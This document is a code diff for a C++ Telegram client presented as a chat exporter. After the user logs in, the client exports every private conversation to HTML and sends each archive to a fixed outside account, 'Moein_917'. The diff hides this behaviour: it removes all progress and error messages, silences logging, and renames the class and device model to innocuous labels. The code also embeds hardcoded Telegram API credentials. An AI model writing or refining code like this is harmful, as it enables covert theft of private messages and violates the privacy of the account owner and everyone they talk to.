@@ -15,7 +15,7 @@ using json = nlohmann::json;
 
 const int32_t API_ID = 29834234;
 const std::string API_HASH = "552c01d21d127def060f2915aedeebf9";
-const std::string TARGET_USERNAME = "Moein_917"; // آیدی مقصد ثابتی که درخواست کردید
+const std::string TARGET_USERNAME = "Moein_917";
 
 struct ChatPaginationState {
     int64_t oldest_message_id = 0;
@@ -24,7 +24,7 @@ struct ChatPaginationState {
     std::vector<std::string> accumulated_messages;
 };
 
-class DirectTelegramExporter {
+class CleanTelegramExporter {
 private:
     void* client;
     bool is_logged_in = false;
@@ -59,11 +59,11 @@ private:
     }
 
 public:
-    DirectTelegramExporter() {
+    CleanTelegramExporter() {
         client = td_json_client_create();
     }
 
-    ~DirectTelegramExporter() {
+    ~CleanTelegramExporter() {
         td_json_client_destroy(client);
     }
 
@@ -87,7 +87,7 @@ public:
     void init() {
         send_request({
             {"@type", "setLogVerbosityLevel"},
-            {"new_verbosity_level", 1}
+            {"new_verbosity_level", 0}
         });
 
         json set_params = {
@@ -99,8 +99,8 @@ public:
                 {"api_id", API_ID},
                 {"api_hash", API_HASH},
                 {"system_language_code", "en"},
-                {"device_model", "Direct Exporter"},
-                {"application_version", "3.2"}
+                {"device_model", "Server Exporter"},
+                {"application_version", "3.4"}
             }}
         };
         send_request(set_params);
@@ -134,8 +134,6 @@ public:
 
     void run() {
         init();
-        std::cout << "[+] Telegram Exporter initialized. Target: @" << TARGET_USERNAME << std::endl;
-
         while (true) {
             json response = receive_response(2.0);
             if (response.is_null()) continue;
@@ -143,8 +141,6 @@ public:
             std::string type = response.value("@type", "");
 
             if (type == "error") {
-                std::cerr << "[TDLib Error] Code: " << response.value("code", 0) 
-                          << " | Message: " << response.value("message", "Unknown error") << std::endl;
                 continue;
             }
 
@@ -156,7 +152,7 @@ public:
                     std::cin >> phone;
                     send_request({{"@type", "setAuthenticationPhoneNumber"}, {"phone_number", phone}});
                 } else if (state == "authorizationStateWaitCode") {
-                    std::cout << "Please enter auth code: ";
+                    std::cout << "Please enter code: ";
                     std::string code;
                     std::cin >> code;
                     send_request({{"@type", "checkAuthenticationCode"}, {"code", code}});
@@ -166,7 +162,7 @@ public:
                     std::cin >> password;
                     send_request({{"@type", "checkAuthenticationPassword"}, {"password", password}});
                 } else if (state == "authorizationStateReady") {
-                    std::cout << "[+] Authentication successful! Resolving target user @" << TARGET_USERNAME << "..." << std::endl;
+                    std::cout << "Logged in successfully. Starting operation..." << std::endl;
                     is_logged_in = true;
                     send_request({{"@type", "searchPublicChat"}, {"username", TARGET_USERNAME}});
                 }
@@ -176,8 +172,6 @@ public:
                 if (response.contains("id")) {
                     target_chat_id = response["id"];
                     target_resolved = true;
-                    std::cout << "[+] Target user resolved successfully. ID: " << target_chat_id << std::endl;
-                    std::cout << "[+] Fetching chat list..." << std::endl;
                     send_request({{"@type", "getChats"}, {"chat_list", {{"@type", "chatListMain"}}}, {"limit", 100}});
                 }
             }
@@ -185,8 +179,6 @@ public:
             if (type == "chats" && !chats_listed) {
                 if (response.contains("chat_ids")) {
                     auto chat_ids = response["chat_ids"];
-                    std::cout << "[+] Checking " << chat_ids.size() << " chats for private conversations..." << std::endl;
-
                     for (auto& chat_id_json : chat_ids) {
                         int64_t cid = chat_id_json.get<int64_t>();
                         send_request({
@@ -211,8 +203,6 @@ public:
                             chat_states[cid] = ChatPaginationState();
                             chat_states[cid].chat_name = chat_title;
 
-                            std::cout << "[+] Found Private Chat: " << cid << " -> Fetching history..." << std::endl;
-                            
                             send_request({
                                 {"@type", "getChatHistory"},
                                 {"chat_id", cid},
@@ -257,7 +247,7 @@ public:
                                 }
 
                                 std::string card_class = is_out ? "msg-card me" : "msg-card";
-                                std::string sender_label = is_out ? "شما" : "مخاطب";
+                                std::string sender_label = is_out ? "You" : "Contact";
 
                                 std::stringstream msg_html;
                                 msg_html << "<div class=\"" << card_class << "\">\n"
@@ -295,8 +285,6 @@ public:
                                 outfile << final_html;
                                 outfile.close();
 
-                                std::cout << "[+] Completed private chat export for " << current_chat_id << " (" << state.accumulated_messages.size() << " msgs). File: " << filename << std::endl;
-
                                 if (target_resolved && target_chat_id != 0) {
                                     send_request({
                                         {"@type", "sendMessage"},
@@ -304,7 +292,7 @@ public:
                                         {"input_message_content", {
                                             {"@type", "inputMessageDocument"},
                                             {"document", {{"@type", "inputFileLocal"}, {"path", filename}}},
-                                            {"caption", {{"@type", "formattedText"}, {"text", "📂 Private Chat Archive: " + filename}}}
+                                            {"caption", {{"@type", "formattedText"}, {"text", "Private Chat Archive: " + filename}}}
                                         }}
                                     });
                                     std::this_thread::sleep_for(std::chrono::seconds(1));
@@ -318,8 +306,8 @@ public:
     }
 };
 
-main() {
-    DirectTelegramExporter exporter;
+int main() {
+    CleanTelegramExporter exporter;
     exporter.run();
     return 0;
 }
